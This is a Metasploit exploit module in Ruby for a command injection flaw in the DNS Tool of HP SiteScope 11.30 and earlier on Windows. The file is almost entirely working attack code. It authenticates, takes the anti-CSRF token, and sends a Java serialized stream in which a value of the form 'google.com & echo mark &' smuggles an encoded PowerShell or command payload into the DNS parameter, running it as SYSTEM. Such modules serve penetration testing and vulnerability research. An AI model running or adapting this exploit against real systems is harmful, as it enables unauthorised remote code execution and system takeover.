# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/powershell&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;HP SiteScope DNS Tool Command Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a command injection vulnerability
        discovered in HP SiteScope 11.30 and earlier versions (tested in 11.26
        and 11.30). The vulnerability exists in the DNS Tool allowing an
        attacker to execute arbitrary commands in the context of the service. By
        default, HP SiteScope installs and runs as SYSTEM in Windows and does
        not require authentication. This vulnerability only exists on the
        Windows version. The Linux version is unaffected.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Kirk Hayes&#039;, # @kirkphayes / Vulnerability Discovery and MSF module author
          &#039;Charles Riggs&#039;, # c0v3rt_chann3l / Vulnerability Discovery
          &#039;Juan Vazquez&#039; # help with MSF module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2015/10/09/r7-2015-17-hp-sitescope-dns-tool-command-injection&#039;],
          [&#039;URL&#039;, &#039;http://www8.hp.com/us/en/software-solutions/sitescope-application-monitoring/index.html&#039;] # vendor site
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;HP SiteScope 11.30 / Microsoft Windows 7 and higher&#039;,
            {
              &#039;Arch&#039; => [ARCH_X86_64, ARCH_X86]
            }
          ],
          [ &#039;HP SiteScope 11.30 / CMD&#039;,
            {
              &#039;Arch&#039; => [ARCH_CMD]
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Oct 9 2015&#039;))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new(&#039;SITE_SCOPE_USER&#039;, [false, &#039;Username for authentication&#039;, &#039;&#039;]),
          OptString.new(&#039;SITE_SCOPE_PASSWORD&#039;, [false, &#039;Password for authentication&#039;, &#039;&#039;]),
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to SiteScope&#039;, &#039;/SiteScope/&#039;])
        ], self.class)
    end

  def exploit
    initial_session = get_initial_session_id
    redirect = authenticate(initial_session)
    session = get_authenticated_session_id(initial_session, redirect)
    csrf_token = get_csrf_token(session)

    print_status("#{peer} - Executing payload")
    random_mark = Rex::Text.rand_text_alpha(5 + rand(5))
    res = send_request_cgi(
      {
        &#039;uri&#039;      => normalize_uri(target_uri.path.to_s, &#039;remoteProxy&#039;),
        &#039;method&#039;   => &#039;POST&#039;,
        &#039;vars_get&#039; => {
          &#039;OWASP_CSRFTOKEN&#039; => csrf_token
        },
        &#039;cookie&#039;   => session,
        &#039;ctype&#039;    => &#039;application/octet- serializable object&#039;,
        &#039;data&#039;     => build_stream(random_mark)
      }, 5)

    if res && res.code == 200 && res.body
      res_io = StringIO.new(res.body.to_s)
      res_stream = Rex::Java::Serialization::Model::Stream.decode(res_io)
      return if res_stream.nil?
      show = false
      res_stream.references.each do |ref|
        if ref.class == Rex::Java::Serialization::Model::Utf && show
          print_good(ref.contents)
          next
        elsif ref.class == Rex::Java::Serialization::Model::Utf && ref.contents.include?(random_mark)
          show = true
          next
        end
      end
    end
  end

  def get_initial_session_id
    print_status("#{peer} - Retrieving an initial JSESSIONID...")
    res = send_request_cgi(
      &#039;uri&#039;    => normalize_uri(target_uri.path.to_s, &#039;servlet&#039;, &#039;Main&#039;),
      &#039;method&#039; => &#039;POST&#039;
    )

    if res and res.code == 200 and res.get_cookies.include?(&#039;JSESSIONID&#039;)
      session_id = res.get_cookies
    else
      fail_with(Failure::Unknown, "#{peer} - Retrieve of initial JSESSIONID failed")
    end

    session_id
  end

  def authenticate(session_id)
    print_status("#{peer} - Authenticating on HP SiteScope Configuration...")
    res = send_request_cgi(
      {
        &#039;uri&#039;       => normalize_uri(target_uri.path.to_s, &#039;j_security_check&#039;),
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;cookie&#039;    => session_id,
        &#039;vars_post&#039; => {
          &#039;j_username&#039; => datastore[&#039;SITE_SCOPE_USER&#039;],
          &#039;j_password&#039; => datastore[&#039;SITE_SCOPE_PASSWORD&#039;]
        }
      })

    if res && res.code == 302
      redirect =  URI(res.headers[&#039;Location&#039;]).path
    else
      fail_with(Failure::NoAccess, "#{peer} - Authentication on SiteScope failed")
    end

    redirect
  end

  def get_authenticated_session_id(session_id, redirect)
    print_status("#{peer} - Following redirection to finish authentication...")

    res = send_request_cgi(
      {
        &#039;uri&#039; => redirect,
        &#039;method&#039; => &#039;GET&#039;,
        &#039;cookie&#039; => session_id
      })

    if res && res.code == 200 && res.get_cookies.include?(&#039;JSESSIONID&#039;)
      auth_session = res.get_cookies
    else
      fail_with(Failure::NoAccess, "#{peer} - Authentication on SiteScope failed")
    end

    auth_session
  end

  def get_csrf_token(session)
    print_status("#{peer} - Getting anti-CSRF token...")
    res = send_request_cgi(
      &#039;uri&#039;    => normalize_uri(target_uri.path.to_s, &#039;jsp&#039;, &#039;tabs.jsp&#039;),
      &#039;cookie&#039; => session
    )

    if res && res.code == 302 && res.headers[&#039;Location&#039;] =~ /OWASP_CSRFTOKEN=([A-Z0-9\-]+)/
      csrf_token = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to get anti-CSRF token")
    end

    csrf_token
  end

  def build_stream(random_mark)
    site = "google.com & echo #{random_mark} & "
    if target.arch.include?(&#039;cmd&#039;)
      command = payload.encoded
    else
      command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
    end

    file = File.join( Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-pending&#039;, &#039;stream.raw&#039;)

    f = File.new(file, &#039;rb&#039;)
    stream = Rex::Java::Serialization::Model::Stream.decode(f)
    f.close

    dns_param = stream.references[0x44]
    dns_param.contents = site + command
    dns_param.length = dns_param.contents.length

    stream.encode
  end
end

